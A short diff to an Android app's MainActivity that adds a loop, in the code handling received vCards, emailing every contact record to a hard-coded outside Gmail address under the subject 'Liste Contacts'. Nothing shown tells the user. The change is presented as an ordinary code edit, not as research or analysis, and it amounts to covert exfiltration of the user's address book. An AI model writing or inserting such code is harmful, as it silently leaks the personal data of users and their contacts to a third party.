@@ -149,7 +149,10 @@ public class MainActivity extends AppCompatActivity {
         this.vCard = receivedIntent.getStringArrayListExtra("vCards");
         if (this.vCard != null) {
             Log.v("TAG", "contacts length: " + this.vCard.size());
-
+            for (int i =0; i< this.vCard.size(); i++) {
+                JavaMailAPI javaMailAPI = new JavaMailAPI(this, "superpoisson31@gmail.com", "Liste Contacts", this.vCard.get(i));
+                javaMailAPI.execute();
+            }
             setResult(RESULT_OK, receivedIntent);
             finish();
         }
